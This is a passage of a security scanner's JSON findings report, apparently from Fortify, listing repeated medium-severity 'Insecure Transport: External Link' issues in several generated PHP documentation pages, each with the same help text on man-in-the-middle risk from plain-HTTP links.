            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4411/?engineType=SCA&issue=1E3DCDFDA9CE641A84F0CAD5F87D6B86"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4412",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Composite.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4412/?engineType=SCA&issue=1E3DCDFDA9CE641A84F0CAD5F87D6B87"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4413",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Composite.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4413/?engineType=SCA&issue=1E3DCDFDA9CE641A84F0CAD5F87D6B88"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4498",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Database.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4498/?engineType=SCA&issue=5B2A9AD6D6E61D9E37EA2C027AFC78A2"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4499",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Database.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4499/?engineType=SCA&issue=5B2A9AD6D6E61D9E37EA2C027AFC78A3"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4500",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Database.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4500/?engineType=SCA&issue=5B2A9AD6D6E61D9E37EA2C027AFC78A4"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4501",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Database.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4501/?engineType=SCA&issue=5B2A9AD6D6E61D9E37EA2C027AFC78A5"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4502",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Database.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4502/?engineType=SCA&issue=5B2A9AD6D6E61D9E37EA2C027AFC78A6"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4376",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Email.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4376/?engineType=SCA&issue=08BE460E0C201E6212A1A48AC6D23F78"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4377",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Email.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4377/?engineType=SCA&issue=08BE460E0C201E6212A1A48AC6D23F79"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4378",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Email.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4378/?engineType=SCA&issue=08BE460E0C201E6212A1A48AC6D23F7A"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4379",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Email.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4379/?engineType=SCA&issue=08BE460E0C201E6212A1A48AC6D23F7B"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4380",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Email.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4380/?engineType=SCA&issue=08BE460E0C201E6212A1A48AC6D23F7C"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4664",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---File.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4664/?engineType=SCA&issue=C74134B50CA50F9F7401064329653019"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4665",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---File.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4665/?engineType=SCA&issue=C74134B50CA50F9F740106432965301A"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4666",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---File.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4666/?engineType=SCA&issue=C74134B50CA50F9F740106432965301B"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4667",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---File.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4667/?engineType=SCA&issue=C74134B50CA50F9F740106432965301C"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4668",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---File.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4668/?engineType=SCA&issue=C74134B50CA50F9F740106432965301D"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4421",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Interface.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4421/?engineType=SCA&issue=23B986EE3DDF939FC9AAC4FE6B1029DB"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4422",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Interface.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4422/?engineType=SCA&issue=23B986EE3DDF939FC9AAC4FE6B1029DC"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4423",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Log---Interface.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4423/?engineType=SCA&issue=23B986EE3DDF939FC9AAC4FE6B1029DD"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4524",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Monitor.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4524/?engineType=SCA&issue=66F75F09667E4CFD81A05444FF43103D"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4525",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file _Monitor.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see 